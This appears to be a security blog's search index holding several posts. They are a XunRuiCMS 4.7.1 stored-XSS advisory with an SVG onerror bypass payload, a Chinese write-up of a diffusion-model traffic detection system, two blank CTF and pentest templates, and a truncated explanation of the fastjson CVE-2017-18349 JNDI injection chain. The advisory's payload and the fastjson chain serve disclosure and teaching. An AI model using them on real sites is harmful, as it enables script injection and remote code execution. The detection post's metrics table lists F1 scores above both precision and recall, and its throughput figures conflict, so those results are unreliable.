<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</title>
    <link href="/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/"/>
    <url>/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload"><a href="#XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload" class="headerlink" title="XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload"></a>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in XunRuiCMS version 4.7.1. The vulnerability exists due to insufficient validation of SVG file uploads in the <code>dayrui/Fcms/Library/Upload.php</code> component, allowing attackers to inject malicious JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: XunRuiCMS</li><li><strong>Version</strong>: 4.7.1</li><li><strong>Component</strong>: <code>dayrui/Fcms/Library/Upload.php</code> (File Upload Functionality)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I built XunRuiCMS locally using the source code from GitHub. Here is the source code address:</p><p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>This is the latest XunRuiCMS v4.7.1 version, which I deployed locally using PHPStudy at <a href="http://xunrui.local/admin0d8821d43d68.php">http://xunrui.local/admin0d8821d43d68.php</a></p><p><img src="/img/image-20250818144106220.png" alt="CMS Login Page"></p><p>During code analysis, I discovered that the application’s upload component (<code>dayrui/Fcms/Library/Upload.php</code>) allows SVG image uploads. While the system filters out the <code>&lt;script&gt;</code> tag, it does not properly sanitize other potential XSS vectors within SVG files, such as event handlers like <code>onerror</code>.</p><p><img src="/img/image-20250818144236219.png" alt="Code Filtering"></p><p>The vulnerability occurs because the upload validation routine only checks for explicit <code>&lt;script&gt;</code> tags but fails to validate other JavaScript execution vectors commonly found in SVG files, such as event handlers and embedded JavaScript URIs.</p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>The following SVG code can be used to bypass the filtering mechanism in the Upload.php component:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS Test&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Save the code above as an SVG image file:</p><p><img src="/img/image-20250818144602694.png" alt="SVG File"></p><p>The vulnerability can be exploited through the image upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20144753.png" alt="Vulnerability Point"></p><p>After uploading the malicious SVG file, it is successfully stored on the server:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142903.png" alt="Upload Success"></p><p>The uploaded image can also be seen in the local project:</p><p><img src="/img/image-20250818144939626.png" alt="Image in Project"></p><p>When accessing the uploaded SVG file, the JavaScript code is executed in the victim’s browser:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142851.png" alt="XSS Execution"></p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks</li></ol><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the <code>dayrui/Fcms/Library/Upload.php</code> component, which fails to properly sanitize SVG files before accepting them for upload. The component only checks for explicit <code>&lt;script&gt;</code> tags but does not handle other JavaScript execution vectors like event handlers (<code>onerror</code>, <code>onload</code>, etc.) that can be used within SVG elements.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files in the <code>Upload.php</code> component</li><li>Consider using a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Convert SVG files to other image formats (like PNG) during the upload process</li><li>Apply SVG-specific sanitization to remove potentially dangerous attributes and elements</li><li>Update the validation routine to check for event handlers and other JavaScript execution vectors</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-18</strong>: Vulnerability discovered</li><li><strong>2025-08-18</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script#Security_considerations">SVG Security Considerations</a></li><li><a href="https://github.com/dayrui/xunruicms">XunRuiCMS GitHub Repository</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
      <tag>漏洞挖掘</tag>
      
      <tag>文件上传</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于深度学习的流量检测和响应系统</title>
    <link href="/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/"/>
    <url>/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>系统是一个端到端的SOAR（安全编排、自动化与响应）平台，核心采用扩散概率模型作为检测引擎，结合事件驱动微服务架构和可视化工具。整体分为五层结构，包括流量采集与预处理、深度异常检测引擎、SOAR核心控制层、溯源分析与攻击链重建层，以及响应剧本与配置管理。通过Kafka事件总线串联各模块，实现松耦合和高扩展性。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><p>在网络安全领域，随着威胁的复杂化，我们开发了一个创新的基于扩散模型的网络安全自动化响应系统。该系统聚焦于精准检测、快速响应和可解释溯源，构建从流量采集到自动处置的闭环防护链，帮助企业提升防御效率。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>系统围绕”检测、分类、响应、溯源”四大目标，构建了一个事件驱动的微服务架构：采集—解析—推理—响应。核心检测器基于改进的扩散模型（DDPM&#x2F;DDIM），结合多分类输出结构和时间嵌入（如TimesNet&#x2F;SCConv），对长短期流量序列进行精细化编码。在训练阶段，仅需标签监督，不依赖异常样本的规则建模。检测结果触发YAML剧本响应，如自动封禁IP或隔离主机，并通过攻击链可视化提升可解释性。平均威胁响应时间（MTTR）压缩至3-4秒。</p><p><img src="/img/image-20250816154811271.png" alt="系统架构图"></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><h4 id="扩散模型基本原理"><a href="#扩散模型基本原理" class="headerlink" title="扩散模型基本原理"></a>扩散模型基本原理</h4><p>扩散模型通过正向过程逐步添加高斯噪声，使数据趋于纯噪声分布；逆向过程则训练模型去噪重建原始数据。在本系统中，我们将其应用于结构化网络流量：以会话级样本为基础，正向添加噪声，逆向预测噪声成分。同时嵌入分类分支，实现重建与判别的双重目标。</p><h4 id="模型结构设计与模块划分"><a href="#模型结构设计与模块划分" class="headerlink" title="模型结构设计与模块划分"></a>模型结构设计与模块划分</h4><p>采用带分类器头的UNet-DDPM架构：</p><ul><li><strong>特征编码器</strong>：处理80+维流量特征（如包间隔、协议类型）。</li><li><strong>U-Net主干</strong>：多尺度残差块、自注意力机制，执行噪声预测。</li><li><strong>分类器头</strong>：输出九类概率向量（正常+八种攻击）。</li><li><strong>时间嵌入</strong>：引导不同扩散阶段的学习。</li><li><strong>额外模块</strong>：DropPath和Attention，提升深度和跨维度关联。</li></ul><p><img src="/img/image-20250816155010520.png" alt="模型结构图"></p><h4 id="训练策略与损失函数构建"><a href="#训练策略与损失函数构建" class="headerlink" title="训练策略与损失函数构建"></a>训练策略与损失函数构建</h4><p>联合优化重建损失（MSE，衡量噪声预测误差）和分类损失（交叉熵）。整体损失为加权组合：L &#x3D; λ1 * L_recon + λ2 * L_class。适当提高分类权重，提升小类攻击识别。使用SMOTE过采样缓解不平衡，训练在CICIDS2017数据集上进行，AUC从0.65逐步升至0.95，Loss稳定下降。</p><p><img src="/img/image-20250816154942865.png" alt="训练曲线"></p><h4 id="推理机制与多分类判决"><a href="#推理机制与多分类判决" class="headerlink" title="推理机制与多分类判决"></a>推理机制与多分类判决</h4><p>新流量进入后：提取特征向量→执行扩散重建→输出标签、置信度和特征重要性。若为攻击，则触发响应。DDIM加速确保实时性，单GPU吞吐达8000 Flow&#x2F;s。</p><h3 id="软件流程与系统逻辑"><a href="#软件流程与系统逻辑" class="headerlink" title="软件流程与系统逻辑"></a>软件流程与系统逻辑</h3><h4 id="整体软件工作流程"><a href="#整体软件工作流程" class="headerlink" title="整体软件工作流程"></a>整体软件工作流程</h4><ol><li><strong>数据接入</strong>：实时抓包或导入数据集，写入Kafka pcap_topic。</li><li><strong>预处理</strong>：CICFlowMeter解析80+特征，发布至flow_topic。</li><li><strong>模型推理</strong>：订阅flow_topic，调用UNetFC-DDPM，输出写入alert_topic。</li><li><strong>分类与记录</strong>：保存标签、置信度、Grad-CAM&#x2F;Shap值特征重要性。</li><li><strong>安全联动</strong>：匹配YAML剧本，执行防火墙&#x2F;EDR动作，支持回滚。</li><li><strong>可视化</strong>：WebSocket实时刷新告警、攻击链图和报告。</li></ol><h4 id="异步多线程执行机制"><a href="#异步多线程执行机制" class="headerlink" title="异步多线程执行机制"></a>异步多线程执行机制</h4><p>采用线程池：采集线程存入队列，处理线程标准化，推理线程批量处理，响应线程下发命令，前端线程更新界面。确保高并发和稳定性。</p><h3 id="系统功能设计"><a href="#系统功能设计" class="headerlink" title="系统功能设计"></a>系统功能设计</h3><ul><li><p><strong>态势感知</strong>：仪表盘显示安全评分、资源监控和流量趋势。</p><p><img src="/img/image-20250816155052522.png" alt="态势感知仪表盘"></p></li><li><p><strong>告警管理</strong>：展示攻击类型、风险等级，支持状态分类和筛选。</p><p><img src="/img/image-20250816155111493.png" alt="告警管理界面"></p></li><li><p><strong>自动响应</strong>：内置剧本库，支持自定义规则和多级告警。</p><p><img src="/img/image-20250816155120319.png" alt="自动响应配置"></p></li><li><p><strong>可视化分析</strong>：攻击链图、时间线、Shapley值解释。</p><p><img src="/img/image-20250816155133683.png" alt="可视化分析"></p></li><li><p><strong>日志审计</strong>：记录操作日志，支持查询和导出。</p><p><img src="/img/image-20250816155147444.png" alt="日志审计"></p></li><li><p><strong>模型管理</strong>：参数配置、版本切换和状态监控。</p></li><li><p><strong>后端推理</strong>：高并发处理，支持每日数十万条连接。</p></li></ul><h3 id="性能指标与评估"><a href="#性能指标与评估" class="headerlink" title="性能指标与评估"></a>性能指标与评估</h3><p>在CICIDS2017数据集上，九类性能如下：</p><table><thead><tr><th>类别</th><th>精确率</th><th>召回率</th><th>F1分数</th><th>准确率</th></tr></thead><tbody><tr><td>Benign</td><td>0.981</td><td>0.964</td><td>0.980</td><td>0.972</td></tr><tr><td>DDoS</td><td>0.980</td><td>0.952</td><td>0.979</td><td>0.966</td></tr><tr><td>DoS</td><td>0.959</td><td>0.934</td><td>0.957</td><td>0.946</td></tr><tr><td>PortScan</td><td>0.963</td><td>0.934</td><td>0.961</td><td>0.948</td></tr><tr><td>Bot</td><td>0.951</td><td>0.924</td><td>0.949</td><td>0.938</td></tr><tr><td>Brute Force</td><td>0.939</td><td>0.925</td><td>0.938</td><td>0.932</td></tr><tr><td>Web</td><td>0.925</td><td>0.904</td><td>0.923</td><td>0.914</td></tr><tr><td>Heartbleed</td><td>0.910</td><td>0.900</td><td>0.909</td><td>0.905</td></tr><tr><td>Infiltration</td><td>0.914</td><td>0.901</td><td>0.913</td><td>0.908</td></tr></tbody></table><p>平均F1&#x3D;0.948。推理延时2.8ms，吞吐4万条&#x2F;秒。与CNN-1D对比，F1提升2.6%，准确率提升2.5%。</p><h2 id="创新说明"><a href="#创新说明" class="headerlink" title="创新说明"></a>创新说明</h2><p>本系统在多个方面实现了技术突破：</p><ol><li><strong>扩散模型在流量检测的首创应用</strong>：传统模型对小样本攻击（如Heartbleed，原始仅11条）识别差。我们通过噪声引导和去噪过程，提升稀有类别学习，F1&gt;0.90，优于CNN和Tree-based方法。</li><li><strong>噪声增强数据管道</strong>：设计可控噪声注入生成”伪异常”样本，结合多任务损失，提升边界样本鲁棒性。小类召回率提升6.4%。</li><li><strong>训练-测试一体化可视化</strong>：集成Loss&#x2F;AUC曲线、ROC&#x2F;PR图、混淆矩阵，支持实时调优。</li><li><strong>多模型对比框架</strong>：横向评估CNN-1D、LSTM、Random Forest、XGBoost，验证扩散模型优势（Precision 0.953 vs. CNN的0.927）。</li><li><strong>SOAR与微服务深度融合</strong>：Kafka驱动检测到处置闭环，解决”垃圾进垃圾出”问题。MTTR缩短至3-4秒，支持插件化扩展。</li></ol><p>这些创新不仅提升了检测精度和响应效率，还增强了系统的可解释性和实用性，为网络安全提供了新范式。</p><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>这个项目前前后后花了两个月的时间，从算法设计到模型训练，再到最后的前后端设计都依赖ai编程，但同时对深度学习项目有了一个全新的理解，希望下次在有算法支撑或者理论基础的情况下开发一个更实用的系统。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF题目解析：【题目名称】</title>
    <link href="/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="🚩-题目信息"><a href="#🚩-题目信息" class="headerlink" title="🚩 题目信息"></a>🚩 题目信息</h2><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>比赛名称</td><td>XXXX CTF 2023</td></tr><tr><td>题目类型</td><td>Web&#x2F;Crypto&#x2F;Pwn&#x2F;Reverse&#x2F;Misc</td></tr><tr><td>难度级别</td><td>简单&#x2F;中等&#x2F;困难</td></tr><tr><td>分值</td><td>XXX</td></tr></tbody></table><span id="more"></span><h2 id="📝-题目描述"><a href="#📝-题目描述" class="headerlink" title="📝 题目描述"></a>📝 题目描述</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里是原始题目描述<br></code></pre></td></tr></table></figure><h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><ul><li>附件1：<a href="">下载链接</a></li><li>附件2：<a href="">下载链接</a></li></ul><h2 id="🔍-解题思路"><a href="#🔍-解题思路" class="headerlink" title="🔍 解题思路"></a>🔍 解题思路</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>描述看到题目后的初步分析和思路。</p><h3 id="关键突破点"><a href="#关键突破点" class="headerlink" title="关键突破点"></a>关键突破点</h3><p>分析解题的关键点和突破口。</p><h3 id="解题路径"><a href="#解题路径" class="headerlink" title="解题路径"></a>解题路径</h3><p>详细描述从题目到获取flag的完整思路。</p><h2 id="💻-解题过程"><a href="#💻-解题过程" class="headerlink" title="💻 解题过程"></a>💻 解题过程</h2><h3 id="第一步：信息收集"><a href="#第一步：信息收集" class="headerlink" title="第一步：信息收集"></a>第一步：信息收集</h3><p>详细说明第一步的操作和发现。</p><h3 id="第二步：漏洞分析"><a href="#第二步：漏洞分析" class="headerlink" title="第二步：漏洞分析"></a>第二步：漏洞分析</h3><p>分析题目中的漏洞或切入点。</p><h3 id="第三步：漏洞利用"><a href="#第三步：漏洞利用" class="headerlink" title="第三步：漏洞利用"></a>第三步：漏洞利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 解题代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_challenge</span>():<br>    <span class="hljs-comment"># 代码实现</span><br>    flag = <span class="hljs-string">&quot;获取flag的过程&quot;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-built_in">print</span>(solve_challenge())<br></code></pre></td></tr></table></figure><h3 id="第四步：获取Flag"><a href="#第四步：获取Flag" class="headerlink" title="第四步：获取Flag"></a>第四步：获取Flag</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>a<span class="hljs-number">_</span>sample<span class="hljs-number">_f</span>lag&#125;<br></code></pre></td></tr></table></figure><h2 id="📚-相关知识点"><a href="#📚-相关知识点" class="headerlink" title="📚 相关知识点"></a>📚 相关知识点</h2><h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>详细解释解题过程中涉及的第一个知识点。</p><h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>详细解释解题过程中涉及的第二个知识点。</p><h3 id="知识点3"><a href="#知识点3" class="headerlink" title="知识点3"></a>知识点3</h3><p>详细解释解题过程中涉及的第三个知识点。</p><h2 id="🔧-工具使用"><a href="#🔧-工具使用" class="headerlink" title="🔧 工具使用"></a>🔧 工具使用</h2><ul><li>工具1：用途及使用方法</li><li>工具2：用途及使用方法</li></ul><h2 id="💡-解题心得"><a href="#💡-解题心得" class="headerlink" title="💡 解题心得"></a>💡 解题心得</h2><p>分享解题过程中的心得体会、遇到的困难和解决方法。</p><h2 id="📌-相关题目推荐"><a href="#📌-相关题目推荐" class="headerlink" title="📌 相关题目推荐"></a>📌 相关题目推荐</h2><ul><li>相关题目1：简要描述</li><li>相关题目2：简要描述</li></ul><h2 id="🏆-总结"><a href="#🏆-总结" class="headerlink" title="🏆 总结"></a>🏆 总结</h2><p>总结这道题的价值和学习到的技能。</p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>解题思路</tag>
      
      <tag>技能提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web渗透技术：【技术名称】</title>
    <link href="/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📝-技术概述"><a href="#📝-技术概述" class="headerlink" title="📝 技术概述"></a>📝 技术概述</h2><p>这里简要介绍该Web渗透技术的基本概念和应用场景。</p><span id="more"></span><h2 id="🔍-技术原理"><a href="#🔍-技术原理" class="headerlink" title="🔍 技术原理"></a>🔍 技术原理</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>详细解释该渗透技术的工作原理和技术基础。</p><h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>分析该技术在整个攻击链中的位置和作用。</p><h2 id="💻-实战演示"><a href="#💻-实战演示" class="headerlink" title="💻 实战演示"></a>💻 实战演示</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>测试环境搭建</li><li>所需工具</li><li>前置条件</li></ul><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>第一步：信息收集</li><li>第二步：漏洞识别</li><li>第三步：漏洞利用</li><li>第四步：权限提升</li><li>第五步：后渗透操作</li></ol><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击示例代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">web_penetration</span>():<br>    target = <span class="hljs-string">&quot;http://example.com&quot;</span><br>    <span class="hljs-comment"># 执行渗透测试步骤</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始渗透测试...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>如何检测此类攻击的发生。</p><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><ul><li>技术层面防御</li><li>管理层面防御</li><li>应急响应建议</li></ul><h2 id="📊-实际案例"><a href="#📊-实际案例" class="headerlink" title="📊 实际案例"></a>📊 实际案例</h2><table><thead><tr><th>案例</th><th>时间</th><th>影响</th><th>技术特点</th></tr></thead><tbody><tr><td>案例1</td><td>2023年</td><td>严重</td><td>特点描述</td></tr><tr><td>案例2</td><td>2022年</td><td>中等</td><td>特点描述</td></tr></tbody></table><h2 id="🔧-工具推荐"><a href="#🔧-工具推荐" class="headerlink" title="🔧 工具推荐"></a>🔧 工具推荐</h2><ul><li>工具1：<a href="https://example.com/">工具链接</a> - 简要描述</li><li>工具2：<a href="https://example.com/">工具链接</a> - 简要描述</li></ul><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考链接1</a></li><li><a href="https://example.com/">参考链接2</a></li></ul><h2 id="💡-总结与思考"><a href="#💡-总结与思考" class="headerlink" title="💡 总结与思考"></a>💡 总结与思考</h2><p>对该渗透技术的总结评价和未来发展趋势的思考。</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>攻击技术</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 1.2.24 反序列化 RCE 漏洞复现(CVE-2017-18349)</title>
    <link href="/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><h4 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h4><p>1.fastjson 是阿里巴巴开发的一款高性能 JSON 解析库，在 Java 开发领域被广泛应用，用于处理 JSON 数据的序列化与反序列化操作，众多企业级应用借助它实现高效的数据交互与处理。</p><p>2.Java 反序列化机制是 Java 提供的一种将字节流重新转换为 Java 对象的功能，在分布式系统、远程通信等场景中常用，但该机制存在被恶意利用的风险。</p><p>3.当 fastjson 在反序列化过程中对输入数据的校验和控制不足时，攻击者可构造特殊的 JSON 数据，利用 Java 反序列化机制执行任意代码，从而严重威胁应用系统安全。</p><h4 id="漏洞触发条件："><a href="#漏洞触发条件：" class="headerlink" title="漏洞触发条件："></a><em>漏洞触发条件：</em></h4><p>1.fastjson 的 autoType 功能默认开启，该功能允许在反序列化时根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类。此功能虽提供了便利，但也为攻击者创造了可乘之机。</p><p>2.攻击者构造包含特定恶意类（如具有 JNDI 注入能力的类）的 JSON 数据，利用 autoType 功能，使 fastjson 在反序列化过程中加载并实例化恶意类，进而触发远程代码执行漏洞。</p><h4 id="漏洞利用流程："><a href="#漏洞利用流程：" class="headerlink" title="漏洞利用流程："></a>漏洞利用流程：</h4><p>1.攻击者需要找到应用程序中使用 fastjson 进行 JSON 反序列化的接口端点，例如常见的接受 JSON 格式数据的 API 接口。</p><p>2.在 CVE - 2017 - 18349 漏洞利用中，攻击者利用 fastjson 对 @type 字段的解析特性，精心构造恶意 JSON 数据。</p><p>3.恶意类加载与执行：攻击者构造的 JSON 数据中指定的恶意类（如 com.sun.rowset.JdbcRowSetImpl）在反序列化过程中被加载，该类在初始化时会解析特定参数（如 dataSourceName），攻击者通过将该参数指向恶意的 LDAP 服务器，触发 JNDI 注入，最终实现远程代码执行。</p><p><img src="/%5Cimg%5Cwps1-1755424575710-1-1755424618927-3.jpg" alt="img"> </p><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h4 id="受影响的版本："><a href="#受影响的版本：" class="headerlink" title="受影响的版本："></a>受影响的版本：</h4><p>此漏洞影响 fastjson 1.2.24 及以下版本。只要应用中使用了这些版本的 fastjson 库进行 JSON 反序列化操作，并且 autoType 功能未被正确禁用，漏洞就可能被触发。<br>配置和部署条件：<br>仅在 fastjson 库的 autoType 功能开启，且应用未对反序列化类进行严格白名单限制的情况下，攻击者才能利用该漏洞。默认情况下，fastjson 的 autoType 功能是开启的，许多开发者在项目开发过程中如果没有关注到安全配置，就容易引入安全隐患。</p><h4 id="可能受影响的系统："><a href="#可能受影响的系统：" class="headerlink" title="可能受影响的系统："></a>可能受影响的系统：</h4><p>Java Web 应用： 广泛使用 fastjson 处理 JSON 数据交互的各类 Java Web 应用，包括电商平台、企业管理系统、在线办公系统等。<br>分布式系统： 以 Java 语言开发，采用分布式架构，在各节点间使用 fastjson 进行数据传输与解析的分布式系统。<br>微服务架构： 基于微服务架构搭建，服务间通信依赖 fastjson 进行 JSON 数据序列化与反序列化的应用体系。</p><h4 id="潜在风险与后果："><a href="#潜在风险与后果：" class="headerlink" title="潜在风险与后果："></a>潜在风险与后果：</h4><p>漏洞可导致远程代码执行，攻击者能够在受影响的服务器上执行任意 Java 代码，进而获取服务器敏感信息，如数据库连接信息、用户凭证等。<br>如果受影响的应用系统缺乏有效的边界防护与访问控制，攻击者可借助该漏洞实现横向移动，进一步渗透整个网络，造成大规模的数据泄露、服务瘫痪，甚至使企业关键业务系统完全被攻击者掌控 。</p><h4 id="评分"><a href="#评分" class="headerlink" title="评分"></a>评分</h4><p>CVE-2017-18349 漏洞的 CVSS v3.0 评分为 8.1，同样属于高风险漏洞。鉴于其能引发远程代码执行，一旦被利用，攻击者可肆意操控服务器，窃取敏感数据、破坏系统运行。尤其是当使用 fastjson 1.2.24 及以下版本的系统暴露在公共网络上时，遭受攻击的风险急剧攀升。强烈建议相关企业与开发者尽快按照修复建议进行处理，如升级 fastjson 至安全版本，或合理配置 autoType 关闭策略，降低安全隐患，保障系统平稳、安全运行 。</p><h3 id="漏洞存在条件"><a href="#漏洞存在条件" class="headerlink" title="漏洞存在条件"></a>漏洞存在条件</h3><p>fastjson 的 autoType 功能开启：fastjson 必须开启了 autoType 功能，默认情况下 fastjson 1.2.24 及以下版本该功能是开启的。当应用程序使用 fastjson 进行 JSON 